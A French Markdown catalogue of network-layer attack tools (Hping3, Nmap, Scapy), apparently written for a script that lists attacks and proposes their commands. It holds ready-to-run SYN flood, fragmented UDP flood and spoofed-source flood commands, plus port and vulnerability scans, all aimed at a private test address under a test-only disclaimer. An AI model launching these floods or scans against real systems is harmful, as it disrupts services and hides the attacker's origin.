# Couche 3 (Réseau) – Attaques et Outils

**Version Testée :**
- Hping3 3.0.x
- Nmap 7.x
- Scapy 2.x

**Description :**  
Ce document recense les outils et attaques disponibles pour la couche Réseau du modèle OSI. La couche 3 est responsable du routage et de la transmission des paquets IP.  
Les outils présentés permettent d’effectuer des attaques de type DoS, des scans de ports, du spoofing IP et la manipulation de paquets.  
Le script automatisé analysera ce fichier pour :
- Lister les outils disponibles (sections marquées par **"### Outil:"**),
- Afficher, pour chaque outil, les attaques possibles (sections marquées par **"#### Attaque:"**),
- Proposer les commandes associées pour chaque attaque (commandes présentées dans des blocs de code sous **"###### Commande:"**).

Vous pourrez enrichir ce fichier ultérieurement sans modifier le script.

---

### Outil: Hping3
**Description :**  
Hping3 est un outil en ligne de commande de manipulation de paquets TCP/IP. Il sert notamment à tester la résistance des systèmes, mener des attaques DoS et analyser le comportement des réseaux.

#### Attaque: SYN Flood
*Détails de l'attaque :*  
Envoyer en continu des paquets SYN pour saturer la cible et perturber le fonctionnement des services.

###### Commande: Lancer SYN Flood
```bash
hping3 -S -p 80 --flood -d 1000 192.168.1.1
```
Détails :
- Port cible : 80.
- Taille du paquet : 1000 octets.
- Option `--flood` pour un envoi continu.

#### Attaque: UDP Flood avec fragmentation
*Détails de l'attaque :*  
Envoyer massivement des paquets UDP fragmentés afin de saturer la bande passante de la cible.

###### Commande: Lancer UDP Flood avec fragmentation
```bash
hping3 --udp -p 53 --frag -d 2000 --flood 192.168.1.1
```
Détails :
- Port cible : 53.
- Payload de 2000 octets.
- Fragmentation activée (`--frag`).

#### Attaque: IP Spoofing
*Détails de l'attaque :*  
Envoyer des paquets avec des adresses sources aléatoires pour masquer l’origine et compliquer la traçabilité.

###### Commande: Lancer IP Spoofing avec Hping3
```bash
hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.1
```
Détails :
- Envoi de 10 000 paquets.
- Taille du paquet : 120 octets.
- Port cible : 80.
- Génération d’adresses sources aléatoires (`--rand-source`).

---

### Outil: Nmap
**Description :**  
Nmap est un scanner de réseau réputé, utilisé pour découvrir des hôtes, identifier les ports ouverts et réaliser des analyses de version et de vulnérabilités grâce à ses scripts NSE.

#### Attaque: Scan de ports rapide
*Détails de l'attaque :*  
Réaliser un scan SYN rapide pour identifier les ports ouverts sur la cible.

###### Commande: Lancer un scan SYN rapide
```bash
nmap -sS -T4 192.168.1.1
```
Détails :
- Scan SYN (`-sS`) avec timing agressif (`-T4`).

#### Attaque: Scan de vulnérabilités
*Détails de l'attaque :*  
Utiliser Nmap pour détecter des services vulnérables via ses scripts NSE.

###### Commande: Scan complet avec scripts NSE
```bash
nmap -sV --script=vuln 192.168.1.1
```
Détails :
- Détection de version (`-sV`) et utilisation des scripts de vulnérabilité (`--script=vuln`).

---

### Outil: Scapy
**Description :**  
Scapy est une bibliothèque Python interactive pour la manipulation de paquets. Elle permet de créer, modifier, envoyer et analyser des paquets IP de façon très flexible.

#### Attaque: Génération de paquets personnalisés
*Détails de l'attaque :*  
Créer et envoyer des paquets sur mesure pour tester la réaction de la cible à des scénarios spécifiques.

###### Commande: Envoyer un paquet ICMP personnalisé
```bash
python -c "from scapy.all import *; send(IP(dst='192.168.1.1')/ICMP())"
```
Détails :
- Envoi d’un paquet ICMP vers 192.168.1.1 via Scapy.

#### Attaque: Analyse du trafic réseau
*Détails de l'attaque :*  
Capturer et afficher un résumé du trafic réseau pour analyser le comportement des paquets.

###### Commande: Sniffer 10 paquets sur l'interface eth0
```bash
python -c "from scapy.all import *; sniff(iface='eth0', count=10, prn=lambda x: x.summary())"
```
Détails :
- Capture de 10 paquets sur l’interface eth0 et affichage d’un résumé.

---

## Précautions Légales & Disclaimer
**Attention :**  
L'utilisation de ces outils et commandes doit être réalisée dans un cadre légal et exclusivement en environnement de test. Toute utilisation malveillante est strictement interdite.

---

## Références & Ressources
- [Hping3 Officiel](http://www.hping.org/)
- [Nmap Official Website](https://nmap.org/)
- [Scapy Documentation](https://scapy.readthedocs.io/)
- [RFC 793 (TCP)](https://tools.ietf.org/html/rfc793)
- [RFC 791 (IP)](https://tools.ietf.org/html/rfc791)
```